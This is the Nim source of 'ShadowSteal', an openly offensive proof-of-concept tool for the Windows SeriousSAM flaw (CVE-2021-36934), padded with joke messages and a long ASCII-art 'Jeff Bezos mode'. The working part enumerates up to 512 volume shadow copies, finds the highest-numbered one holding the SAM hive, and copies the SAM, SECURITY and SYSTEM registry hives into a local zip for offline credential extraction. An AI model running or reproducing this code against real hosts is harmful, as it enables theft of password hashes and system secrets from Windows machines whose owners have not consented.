#[
    ShadowSteal | Nim Implementation | v.03.69 the N I C E update
    Author: HuskyHacks
    Original Disclose by @jonasLyk :)
    POC: enumerates host drives for shadow volumes of SAM, SYSTEM, and SECURITY hive keys.
    First build: naive implementation, no OPSEC considerations, hacky, and that's the way I like it.
    PRs welcome :)
    Now featuring cleaner code, thank you to @orbitalgun!
    Coming soon: @gentilkiwi's recommendation to use the API instead of bruteforcing
]#

import os
import strutils
import times
import zippy/ziparchives
import random
import argparse
import sequtils
import tables
import winim


var p = newParser:
    help("[*] ShadowSteal! Identifies and extracts credentials that can be stolen due to the SeriousSAM (CVE-2021-36934) exploit. Searches from high to low, defaults searching 100 to 1.")
    flag("-t", "--triage", help="[*] Triage mode. Quick enumeration, tries to find quick wins.")
    flag("-bf", "--bruteforce", help="[*] Bruteforce mode. Enumerates the entire range of possible locations (512 to 1). Takes a bit.")
    flag("-b", "--bezos", help="[?] Jeff Bezos Mode")


let time = cast[string](format(now(), "yyyyMMddhhmm"))

# Fantastic tip from @vinopaljiri: the maximum possible number of shadow copies is 512, and you probably want the one that is numbered highest. Algorithm now decrements to find the target files.
# Brute Force solution for now. Binary search tree coming soon.

proc search(min: int, max: int): int =

    var isFound: bool = false

    echo "[*] Executing ShadowSteal..."
    echo "[*] Time: ", time
    echo "[*] Searching for shadow volumes on this host..."
    
    var results: seq[int] = @[]
    for i in countdown(max,min):
        let configPath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\SAM"
        echo "[*] Checking HarddiskVolumeShadowCopy" & $i
        if fileExists(configPath):
            isFound = true
            echo "[+] Hit!"
            echo "[+] HarddiskVolumeShadowCopy" & $i & " identified."
            results.add(i)
        else:
            var nopes = ["Nope", "Nah fam", "Nein", "Negative", "No", "Not there", "No way", "No :("]
            let nope = sample(nopes)
            echo "[-] " & nope
    if isFound:
        let location = results[maxIndex(results)]
        echo "[+] Highest Shadow Volume located: HarddiskVolumeShadowCopy" & $location
        echo "[*] This likely has the most up to date credential information. Exploiting!"
        return location
    else:
        echo "[-] No luck, fam."
        quit(0)

proc exploit(location: int): void =
    let archive = ZipArchive()
    let configPath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $location & "\\Windows\\System32\\config\\"
    echo "[+] Exfiltrating the contents of the config directory..."
    for elem in @["SAM", "SECURITY", "SYSTEM"]:
        let fi = getFileInfo(configPath & elem)
        archive.contents["HarddiskVolumeShadowCopy" & $location & "/" & elem & "_" & $fi.lastWriteTime] = ArchiveEntry(contents: readFile(configPath & elem))
    echo "[+] Hives extracted!"
    echo "[*] Compressing... ", time & "_ShadowSteal.zip"
    archive.writeZipArchive(time & "_ShadowSteal.zip")

    echo "[+++] SUCCESS!"
    echo "[+++] SAM, SECURITY, and SYSTEM Hives have been extracted to " & time & "_ShadowSteal.zip"


proc jeffBeezy(): void =
    echo "[!!!] JEFF BEZOS MODE ENGAGED"
    write(stdout, "[!!!] You should make your terminal full screen for this one. Press any key to continue ->")
    discard readLine(stdin)
    
    echo """
 ██████╗███████╗ ██████╗                                                                                                      
██╔════╝██╔════╝██╔═══██╗                                                                                                     
██║     █████╗  ██║   ██║                                                                                                     
██║     ██╔══╝  ██║   ██║                                                                                                     
╚██████╗███████╗╚██████╔╝                                                                                                     
 ╚═════╝╚══════╝ ╚═════╝
"""
    sleep(1000)
    
    
    echo """
███████╗███╗   ██╗████████╗██████╗ ███████╗██████╗ ██████╗ ███████╗███╗   ██╗███████╗██╗   ██╗██████╗                         
██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║   ██║██╔══██╗                        
█████╗  ██╔██╗ ██║   ██║   ██████╔╝█████╗  ██████╔╝██████╔╝█████╗  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝                        
██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██╔══╝  ██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗                        
███████╗██║ ╚████║   ██║   ██║  ██║███████╗██║     ██║  ██║███████╗██║ ╚████║███████╗╚██████╔╝██║  ██║                        
╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
"""    
    sleep(1000)
    
    
    echo """                                                                                                                  
██████╗  ██████╗ ██████╗ ███╗   ██╗    ██╗███╗   ██╗     ██╗ █████╗  ██████╗ ██╗  ██╗                                         
██╔══██╗██╔═══██╗██╔══██╗████╗  ██║    ██║████╗  ██║    ███║██╔══██╗██╔════╝ ██║  ██║                                         
██████╔╝██║   ██║██████╔╝██╔██╗ ██║    ██║██╔██╗ ██║    ╚██║╚██████║███████╗ ███████║                                         
██╔══██╗██║   ██║██╔══██╗██║╚██╗██║    ██║██║╚██╗██║     ██║ ╚═══██║██╔═══██╗╚════██║                                         
██████╔╝╚██████╔╝██║  ██║██║ ╚████║    ██║██║ ╚████║     ██║ █████╔╝╚██████╔╝     ██║                                         
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝╚═╝  ╚═══╝     ╚═╝ ╚════╝  ╚═════╝      ╚═╝ 
"""  
    sleep(1000)
    
    
    echo """                                                                                                                       
     ██╗███████╗███████╗███████╗██████╗ ██╗   ██╗██╗   ██╗██╗   ██╗██╗   ██╗██╗   ██╗██╗   ██╗                                
     ██║██╔════╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝╚██╗ ██╔╝╚██╗ ██╔╝╚██╗ ██╔╝╚██╗ ██╔╝╚██╗ ██╔╝                                
     ██║█████╗  █████╗  █████╗  ██████╔╝ ╚████╔╝  ╚████╔╝  ╚████╔╝  ╚████╔╝  ╚████╔╝  ╚████╔╝                                 
██   ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗  ╚██╔╝    ╚██╔╝    ╚██╔╝    ╚██╔╝    ╚██╔╝    ╚██╔╝                                  
╚█████╔╝███████╗██║     ██║     ██║  ██║   ██║      ██║      ██║      ██║      ██║      ██║                                   
 ╚════╝ ╚══════╝╚═╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝      ╚═╝      ╚═╝      ╚═╝      ╚═╝ 
 """
    sleep(1000)
    
    
    echo """ 
     ██╗███████╗███████╗███████╗██████╗ ██╗   ██╗    ██████╗ ███████╗███████╗ ██████╗ ███████╗███████╗███████╗███████╗███████╗
     ██║██╔════╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝╚══███╔╝██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
     ██║█████╗  █████╗  █████╗  ██████╔╝ ╚████╔╝     ██████╔╝█████╗    ███╔╝ ██║   ██║███████╗███████╗███████╗███████╗███████╗
██   ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗  ╚██╔╝      ██╔══██╗██╔══╝   ███╔╝  ██║   ██║╚════██║╚════██║╚════██║╚════██║╚════██║
╚█████╔╝███████╗██║     ██║     ██║  ██║   ██║       ██████╔╝███████╗███████╗╚██████╔╝███████║███████║███████║███████║███████║
 ╚════╝ ╚══════╝╚═╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝
 """
    sleep(1000)
    echo """
WMMMMMMMMMMWWWWWNWWNWWWMMMMMMMMMMMWNWWWWWNNNNWMMMMMMMMMMMWNNWWWWWNNNWWWNNXNNNXXXXXXKKKKKXNNWMMMMMMMMMMMWWWWWWWWWWNWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWNWWNWWWMMMMMMMMMMMWNWWWWWNNNNWMMMMMMMMMMMWNNNNNWWWWWWWWWWWWWWNNXXXXXKKKKXXNNNWWMMMMMMMMWWWWWWWWWWNWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWNWWNWWWMMMMMMMMMMMWWWWWWWNNNNWMMMMMMMMMMWNNNNWWMMMMMMMWWWWWWWWNXXXKKKKKKKXXXXNNWWWWWWMMWWWWWWWWWWNWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWNWWNWWWMMMMMMMMMMMWNWWWWWNNNNWMMMMMMWWNNNNNNWWWNWNNNNNXXXXKKKKKKKKK000000KKKKKXXXNNNNNWWNWWWWWWWWNWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNNXXXXXXXXXXKKKKK00000OOOOOOOOOOO00000000000000KKXXXXNNNNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWNNWWWWWMMMMMMMMMMMWWWWWWWWNWWWMMMMMMMMMMWNXXKKKKKKKKKK000000OOOOOOOOOOOOOOOOOOOOOOOOO00000000000KKKKXXXNWWMMMMWNWWWNWWWWWWMMMMMMMMMMWWWNWWWWWWWWM
WWWWWWWWWNWWMMMMMMMMMMMWWWWWWWWNWWWMMMMMMMMWWXK000000000K0000000000OOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000000KKKXXNWWWWNWWWWWWWWWWMMMMMMMMMMWWWWWWNWWWWWM
WWWWWWNWNNWWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMWNK0OOOO000KKKKKKKKK000000OOOOOOOOOOOOkkOOOOOOOOOOOOOOOOOOOOOOO000000KKXXNNNWWWWWWNWWWMMMMMMMMMMWWWWWWNWWWNWM
WNWWWWNNNWWWMMMMMMMMMMMWWWWWWWWWNWWMMMMWNKOOkkOOO0KKKKKKKKKK000OOOOOOOOOOOOOOOOOOOOkkkOOOOOOOOOOOOOOOOOOOOOO00000KKXXNNNNWNNNWWMMMMMMMMMMWWWWWWWWWNWWM
WWWWWWWWWWWWMMMMMMMMMMWWWWWWWWWWWWWMMWNKOkkkkOOO0KKKKKKKKK0000OOOOOkkOOOOOOOOkkkkkOkkOkOOOOOOOOOOOOOOOOOOOOOOO000000KKXXNNWWWWWMMMMMMMMMMWWWWWWWWWWWWM
WMMMMMMMMMMWWWWWWWWWWWWWMMMMMMMMMMWWNKOkkkkkkO00KKKKKKKKK0000OOOOOOkkkOOOOOOkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000KKXWMMWWWWWWWWWWWWWWMMMMMMMMMWW
WMMMMMMMMMMWWWWNWWNWWWWMMMMMMMMMMMWXOkkkkOOkOO000000000000OOOOOOOOOOOkOOOOOOkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000KNWMWNNNNNNNNWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWNWWWNWWWWMMMMMMMMMMWKkkkkkkOO000000OOOOOOOOOOOOOOkkOOOOOOOOOOOOOOOOOOOkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00KNWWNWWWWNNWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWNWWNNWWWWMMMMMMMMMN0kkkkkOOO00000000000OOOOOOOOkkkkOOOOOOOOOOOOOOOOOOOkkOkOOkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOO000XNNNWWWNWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWNNWWWWNWWMMMMMMMWN0kkkkkOO000000000000OOOOOOOOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00KXNWWNWWNWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWWWWWWWWWMMMWWWKOkkkOOO0OO000000000OkkOOOOOOOOOOOOO00000OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0KXNWWWWWWWMMMMMMMWWMWW
WWWWWWWWWWWWMMMMMMMMMMMWWWWWNKOOOOO0000000000OOOOkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0OOO0KX0xd0WMWWWWWWWWWWWWM
WNWWWWWNNWWWMMMMMMMMMMMWWNXK0OkkOOkkOOkdddddddxxxxxxxxkkkkOOOkkkkOOOkkkkkkkkkkOOOOOOOOOOOOOOOO000OOOOOOO000OOOOOOOOOOOOO00000000000OdcoKWWWWNWWWWNNWWM
WNWWWWWNNWWWMMMMMMMMMMMW0doddoololc:::;,,'',;:cclodddddxxxkkxxkkkkkkkkkkkkkkkkkkkkOkkkOOOkOOOOOOOO00OOO000000OOOO00OOOOO00000000OO000kodKWWNWWNWWNNWWM
WNWWWWWNNWWWMMMMMMMMMMNOoldoc:::cc::;,,,''...',,;clooooodddddddxkxxxxkxxxxxxxxddoolllllccccllodxkkOO00O00000OOOOOOOOOOO0000000000OOO00kdxk0NWNWWWNNWWM
WNNWWWWWNWWWMMMMMMMMMWOclolcclodxxkxddol:;'....'',;cloooooodddxxxxxxxddooooll:::,,''''''',,,,,;:cloxkOOOOOOOOOO000OOOOO0000000000OOO000OxodKNNWWWWWWWM
WWWWWWWWWWWWWWWWWWWWWWOll::lodxkkkOOOOkkxxoc;'.''',;clllldxkkkkkkxxddolccc;,,,,'....'''',,,,,,'',,,;codxkOOOOOO00000000000OOO000OOOOOOOOOkxkOKWWWWWWWW
WMMMMMMMMMMWWWWWNWWNWXklclodxxxxxxxxxxkkkkkkxo:,''',;;:cdkkkxxxxkkkdolccc:;;;;,,,,,,,;::cccc::;,,,,,;;:cldxkOOO000000OOOOOO0000000OOOOOkkOOkodKMMMMMMW
WMMMMMMMMMMWWWWWWWWWNOdoodxkkkkxxxxxddddddddxkxdc;''.';dkO0OOOkkxxkxolccc::::::::ccodxkkkkkxxddollc::;:::ldxkOOOOO000OOOOO00OOOO00OOOOkxxkkkkkOXMMMMMW
WMMMMMMMMMMWWWWWWWWWKxxxdolcclcccccclllccllloodddoc;;lxO00000000OkxdollcccccccllodxkkkkkkkkkkkkkkkxxollcclodxOOOOOO00000000OOOOOOOOOOkkxdxkkkkx0WMMMMW
WMMMMMMMMMMWWWWWWWWNOxdl:,';::cccllllllccccccccclodxkOOO0000000000OxdddollccllloddddddddddxkkOOOOOOOkkxdooodxkOOOOO0000000OOOOOOOOOOOOkxddxxxxk0NMMMMW
WMMMMMMMMMMWWWWWWWWXkxc,..';;::::cc:::::::::::cldkO0000000000000000kxddoc:::::cllllooddddddxxkkOO0OOOOOOOxddxkOOOOO00000000OOOOOOOOOOkkdoooooddxkKWMWW
WWWWWWWWWWWWWMMMMMWXko:,'''','',,,,,;;:ccccllok0KXXKK000000000000000koollc::;,,,,,;;:cllllloolodxkOOO0000OkxdxkOOO0000000000OOOOOOkkkxxdllc:cclodxKWWW
WNWWWWWWWNWWMMMMMMW0o:'.,looollllllloooooooodk0KKK00000000000000KK000kdlccccccc::;;;;::ccclodollclloxkO000OOkxkOOO00000000000OOOkkkkkxxdoc::ccclodONWM
WNWWWWWWWWWWMMMMMMXkoc;:ccccccc::::cccclloodk00KK000000000000000K00000kxo:;;;:loddolc:;;;,,:ccoddoc;:ldO0K0OOkkOOOO00000000000OOOkkkkkkkdlc:::clodONWM
WNWWWWWWWWWWMMMMMWKxooooooooooooooodxxkkkxxk000000O0000000000000000OkOOOkxdol:;;:clloooolccc:;:c:::;,,:ok000OOOkOOO000000K0000OOOkxkOOOOkxl::::ccoOXWM
WNWWWWWWWWWWMMMMMNOdoodxO000000000K00OkxddxkOOkkkkOO000000000000000OxdkOOO000Oxlc;;;::ccloodxxxxdooc;,;cdO0K00OkkOO00000KKKK000OOkxkOO0Okxoc:;::;cdKWM
WWWWWWWWWWWWMMMMWKxddxxkO00KKK00000Okdooddooodooodxk00KKKKKKKK000000kooxkO0000K00kxddooollooodxkOO0OdccoxO0000OOOOO000000KK00OOOOkkkO0Okkxolc;;:::l0WW
WMMMMMMMMMMWWWWWNKkxxxxkOO0000OOOxdocclddlc:ccccclodkO0000KKKKKK0000kocldxkO0000KKK000000OOkkkkkkkOOkkxxkO00000OO000000000000OOkOOOO000OOOkdlc;,;:cxXW
WMMMMMMMMMMWWWWNXOxxxxxkkkkkkkxxolc:;:lc;;;:;,;::cloxkOOOOOO0KKKKK0Oxoc:codxkO0000000000000000000OOkOO0000000000000000000000OOkkkOO0000KK0Oxoc:,',:xXW
WMMMMMMMMMMWWWNKkdddddxxxxxxddoc:;;'.,;.....'',;;:clxkkxooooxkO0KKK0xdo:;:lodxkOOO0000000000000KK000OO00000K000000000000000OOOkxxkO000KKXKkddl:;,':dXW
WMMMMMMMMMMWWWXkddddddddddddoc:;;,'......  ..',,,,:lxdl;....';ldk00Odddl;,:cloxkOOOOO0000000000KKKKKK00000000KK00000000000OOOOkxxxk00KK00Oxolc;,',cd0W
WMMMMMMMMMMWWNOdooooooddoolc:;,,'..   .'.. ....'',;lxxkkxl;,'',:oxxdddxd:,,,;coxkkkOOOO000000000KKKKKKKK00KKKKKK0000000000OOkxxxxkO00KK0O00dcll;'';l0W
WWWWWWWWWWWWWKxloolooooool:;,,,..    .cdo,.......';lodxxkkkxdoccllodxxxdo:'.';codxkkOO000KKKKKKKKKKKKKKKKKKKKKKK0000000OOOOkkxxxxkkO0KKK00kdooc,'',:kN
WWWWWWNWWWWWW0olllllllllc;,,,''.   .'cddoc;,'....,;codxxxxkxxddddddxxxxxxo:,'',cldxxkO00KKKKKKKKKKKKKKKKKKKKKKKKK00000OOOOOkxxxxdxxk00KK0kxdoc;'.';o0W
WWWWWWWWWWWWNxllllllllc;;,,,''..  .'collcc::::;;;::cloddxxxkkkkkkkxxxxxxxxol:..,:lodxkO0KKKKKKKKKKKKKKKKKKKKKKKKKKK0000OOOOkxddoddxkO0KKKOkko:;,'':kNM
WWWWWWWNWWNXOoclllllc:;,,,,''''...,looollcccc:;;::::coddxxkkxxxkxxxdddxxxxxxo;..,:lodxkO00KKKKKXXXXXXKKKKKKXXXXKKKKK0000OkkkxddoodxxkOO0X0kkxl;''':OWM
WNWWWWWWNX0xolcccllc:;,,,,,'''...;lddoooolllc:;;;;::clodxxxxxxxxxxxddxxxxxxxdl,..,:lodxkOO00KKKXXXXXXXKKKKXXXXXKKKKK00K00OkkxdoooodxxkkOKOxkdc,'.'oXWM
WWWWWWWWXx::cccccccc;,,,,,'''...;lddddddddxxdollccclllodxkkkxkkkkkkxxxxxkxxxxdc'..,:lodxkOO0KKKKXXXXXKKKKKXXXXXKK0KKKKKKK0OOkxdloodxkkO0Okxxdc,'.:0WWM
WWWWWWWW0c;:llcclccc;,,,,,'''..;loooddddxxxxxxxxxdddddxxkkOOOOOkkkkkkxxxxxdxxxo:..';codxkkO00KKKXXXXXKKKKKKXXXKKK00KKKKK000Okkdolldkkk00Okxxdl;..lXWWW
WMMMMMMWO:;cllcllccc:;;;,'''..'looolllllloooodddoooddxxkOOO000OOOkkkkkxxxddddddl;..':lodxkOO00KKKKKKKKKKKKKXXKKKK00KKKKKK000Okdolodxkkkkkkxdo:'.,kWMMW
WMMMMMMWO::lllllcclllc;,,''...:llc:;;,,,;;::::cccccllooddxkkOOOOOOOOOOkxddddddddc,..,codxkOO00KKKKKKKKKKKKKKKKKK000000KK0000Okxooddxkkxxkxoll:''lXMMMW
WMMMMMMNk:clllllllllllc;,''..'c:,'.........''',;;;:::cccclllodxxxkOOOOOkdoooddddo:'.':loxkOO0000KKKKKKKKKKKKKKKK000000000000OOxdddxxxxooxxoc:;,c0WMMMW
WMMMMMMNd:clllllllllodo:,''..';'......   ......'',;;;:;;;;;;;:cccldxxkkkxddddddddl,..;lodkOO000KKKKKKKKKKKKKKKKK00000000000OOkkkkkkkxxooodoc:;'oXMMMMW
WMMMMMMXdcclllllllllodo:,'.........    ...;::cc:clloxxoldxd:,,;,;;::cloxxddooooooo:..,codxkO000KKKKKKKKKKKKKKKKK000000000OOOkOOO0000OkkOOkkkkxxkKNWWWW
WWWWWWWKoclcclllllloooc;''.......   ....'cdolodlcloxO0OO0K0dlool:....';:clooooolool,.':ldxkO000K0KKKKKKKKKKKKKKK000000000OOkOOO0KKK0000KKKKKKKKKKKKXNW
WWWNWWW0occccclllllool;,''......    ................',,;col:okkkl:;;....';:clolcclc,.':ldxkO00KK0KKKKKKKKKKKKKKKKKK00000OOOOOO000K0000KKKK0OxooooxO0KN
WWWWWWN0occccclllooodc;,,'.....                             .;ll:lxx:.  ..;:cllc:cc,.':ldxkOO00K00KKKKKKKKKKKKKKKKK000000OO0000000000000OkkOxo:;,;cdOK
WNWWWWWKdccccllloooddc;,,'....           ....                 ....,,'..   .',:c:;:c,.,cldxkO000000KKKKKKKKKKKKKK000000000O00000OOkkO000OkOKXXKOo:;;:ok
WWWWWWWNkc::cclloooddl;,,''''.         .....                     .          .'::;::'.;codxkO000000KKKKKKKKK0000000000000000KKKOkxxkk0KK0KKKXXXK0xolclx
WWWWWWWWOc::cclooooddo:,,,,,,..         ..                                   .';;:;'';lodxkO0000000K00KKKK00000000000000000KKKOkkxookKKKKKKKXKKK0Okxdx
WMMMMMMNkc:::clodooddoc;;,,,,'...                                            .,:::;.':lodxkO000000000KK00000000000000000000KKK0Oxl;;cxO0KKKKKKKK0OkxxO
WMMMMMWKxc:::cloddddddlc;,,,,'.. .                                         ..:lccc,.,:loxkOO000000000000000O000000KK000000KKKK0Oxdl::odk0KKKXKKK0OOkk0
WMMMMMXOxl;;:clddxxddooc;,;oxl'..                                        .:loooolc,';codxOO0000OOO000000000O00000000000000KKKKK0OOOdloxkkO0KKKKK00OkkK
WMMMMWKkko;;:codxxxxdoll::lk0O:......                                 ..;oxxdoooo:'':ldxkO00OOOOOOO00000OOOOO00000000000KKKKK000OO0kdodxkkO0KKKK00kk0X
WMMMMWKkko;;:codxxxxdolllodxOOd:'.....                             ..,coddddddodo:',codxkO0OOOOOOOOOOOOOOOOOO0000000000KKKKKK0O00OOOxodxxkkO0KK00Ok0XN
WWWWWW0xoc;,;codxxxxdooodddodxdddoooooollcc:::::;;,,''..........';codxddddxxxdddo:,;ldxkOO0OOOOOOOOOOOOOOOOOO0000OOO00KKK000000KKK00OkxxxkkOKK0OOO0XWW
WWWNWNX0kxl;,:odxxxdddxxddddooodxkO00KK00Okkkkkkkkkkxxxdolllloodxxkkkkxddxxxxxdol;;coxkOOOOOkkkkkOOOOOOOOOOOOOOOOOOOO0KXK000OkkO0KK00OkxkkO0KKOkO0XNWM
WWWNWWWWWWXo;:ldxxxxxxxxxxddoloooddxxxxxxxddddxxxkkOO000kkOkkOOOkkkkkkkxddxxxddoc:codkOOOOOOkkkkkOOOOOOOOOOOOOOOOOOO0KKKKKK00OO0KKK0OkkkOO0KKOOOKXNNWM
WNWNNWWWWWWO:;ldxxxxxxxxxxdllccccccclllllloooooodxxOO000OOOO0000OkkkkkkxxxxxxdolccodxkO0OOkkkkkkkOOOOOkkkkOOOOOOOOO0OO0KKKKKK000KKKK00000KKK0O0KNNNWWM
WWWWNWWWNWWXo;ldxxxkkxxdddolc::;;;,,,,;;;::::ccclooddxkkkOOOOOOOOkkkkkkxxxddddollodxkOOOOkkkkkkkkkkkkkkkkkOOOOOOOOOdlxOKKKKKKKKKKKKKKKK0000000XNWWWWWM
WWWWWWWWWWWWOccdxxxkkkxdddollc:::;,,,;;;;;;;:::cclloodxxkkOOOOO0OkkkkkxxxddddoooodxkO0OOkkkkkkkkkkkkkkkkkOOOOOOOOOl';dO0KXKKKKKKKKKKKK000000KXNWWWWWWM
WMMMMMMMMMMWKocoxxkkOOxdxxollllc::;;;;;;;::::::cllloodxxkkkOOOOOOkkkkxxxdddooooodxkO00OkkkkkkkkkkkkkkkkOOOOOOOOOOl..'lxO0KXKKXKKKKKK00000KXNWMMMMMMMMW
WMMMMMMMMMMMNkcldxkkOOOkkxdollllccc:cc:::::cccccllooddxxxkkkOOOkkxxxkxxddddddddxkkO0OOOkkkkkkkkkkkkxkkkkOOOOO0OOo'..,lodkO0KKKKKKKKKK0KKXNWMMMMMMMMMMW
WMMMMMMMMMMWW0ccodxkkOOOOkxxooolllllllooollllccclloooddxxkkkkkkkxxxxxxddddxxxxxkkO0OOOkkkkkkkkkkkkkkkkOOOOOO00Od;.':dxxxdodkk000KKKKKXNNNWMMMMMMMMMMMW
WMMMMMMMMMMWWXd:lodxkOOOOOkkkkxxkkkOO000OOOkkxxxxxxxxxxxkkOOkkkkxxxxxxxxxxkkkxkkOOOOOkkkkkkOkkkkkkkkkOOOOOOOOOkdccoxkkkxxx0KXNNNNNNNNWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWW0lcloxkkOOOOOOOOOOO0000OOOkkkkkkOOO0OOOOOkkOOOkkkkkkkkkkkkkkOOOOOOOOOOOOOkOOOOOOkkkkkkOOOOOOOOOO0OkkkOO00KNWMMMMWWNWWNNWNWWWMMMMMMMMMMMW
WWWWWMWWWMMWWWNx:clodxkkkkkOOOOO000OkkkkxxkkkkkkOOO000OOOOOOOOOOOO0OOOOOOOOOOOO0OOOOOOOOOOOOOOOkkkkOOOOOOOOOO0K0O00KXNWWWMWWWWWWWWWWWWWWWWWMWWWWWWMWWW
WWNWWWWWWWWWMMMKo:cloodxxkkkkkkkOkkkxxxxddxxxxxxkkkO000OOOO00000000000OOOOOOOOOOOkkOOOOOO0000OOOkkkkkkOOOOOO0KKXXNWWNWWWWWWWWWWMMMMMMMMMMWWWWWWWWWWWWM
WWWWWWWWWWWWMMMW0c;::ccloodddddxdddddoooooddddddxkkOO0000OO000000OOO00OOOOOOOkkkkkkOO0000000OOkkkxkkkkkkkOO0XNWWMMWWNWWWNWWNWWWMMMMMMMMMMWWWWWWWWWWWWM
WWWWWWWWWWWWMMMMWk;',;;:::cclooooooooolllllooddddxxkO0000000000000OOOOOOOOOOkkkkOOkOOOOOOOOOOkkkkxxxkkkO0XNWMMMMMMMWWWWWWWWWWWWMMMMMMMMMMWWWNNWWWWWWWM
WWWWWWNWWWWWMMMMMNd,.'''',,,;:cccclllllllccllooooddxkkkOOOOOOOOOOOOOOkkkkkkkkkkOOOkOOOOOOOOkkkkxxxkO00XNWMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMWWWWWWWWWWWWM
WWWNWWWWWNWWMMMMMMXd'.........',;::cccccc:ccccccloodddxxxkkkkkkkkkkkkxkxxxkkkkkkkkkkkkkkkkkkkkkkO0KXNWWWMMMMMMMMMMMWWWWWWWNNWWWMMMMMMMMMMWWNWWWWWWNWWM
WWWWWWWWWWWWWWWWWWWXx,...........',;;;;;;;;;;::ccclloodddxxxxxxxkkxxxxxxxxkkkxxxxxxxxxxxxxkO0KXNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WMMMMMMMMMMWWWWWWNWWNOc.. ...........'''''''',,,;:::cloooodddddxdddddddxxxxxxxdddddddxOO0KXNWMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWWWNWWWN0xc,....................'',,;;:cclllollllllooooddddoddddxkOO0KXNNNWNWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMWNWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWWWWNWWWMMWN0xoc;,..................',,,,;;;;;,;::clllodxkkO00KXNWNNWWWWWWWWWMMMMMMMMMMMWWWWWWWWWNWWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWWWWNWWWMMMMMMMWNX0xdlc:;,''............'''',;:lodxkO0XXNWWMMMMMMWWNWWWWWWWNWMMMMMMMMMMMWWWWWWWWWNWWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
WMMMMMMMMMMWWWWWWWWNWWWMMMMMMMMMMMWWWNXK00OkxdooolloooodxxkO0KXXNNNWWMMMMMMMMMMMWWWWWWWWWWNWMMMMMMMMMMMWWWWWWWWWNWWMMMMMMMMMMMWWWWWWWWWWWWMMMMMMMMMMMW
"""



when defined(windows):
    when defined(i386):
        echo "[-] Not designed for a 32 bit processor. Exiting..."
        quit(1)
    
    when isMainModule:
        # There is probably a much better way to parse args but I'm getting hangry so this will have to do
        try:
            let opts = p.parse()
            if opts.bruteforce and opts.triage:
                echo "[-] Cannot brute force and triage. Please pick one."
                quit(1)
            if opts.bruteforce:
                let searchMin = 1
                let searchMax = 512
                echo "[*] Bruteforce mode enabled."
                let result = search(searchMin, searchMax)
                exploit(result)
            if opts.triage:
                let searchMin = 1
                let searchMax = 10
                echo "[*] Triage mode enabled."
                let result = search(searchMin, searchMax)
                exploit(result)
            else:
                let searchMin = 1
                let searchMax = 100
                echo "[*] Default mode enabled."
                let result = search(searchMin, searchMax)
                exploit(result)
            if opts.bezos:
                jeffBeezy()
            echo ""
            echo "[*] Done! Happy hacking!"
            quit(0)
        except ShortCircuit as e:
            if e.flag == "argparse_help":
                echo p.help
                quit(1)
        except UsageError:
            stderr.writeLine getCurrentExceptionMsg()
            quit(1)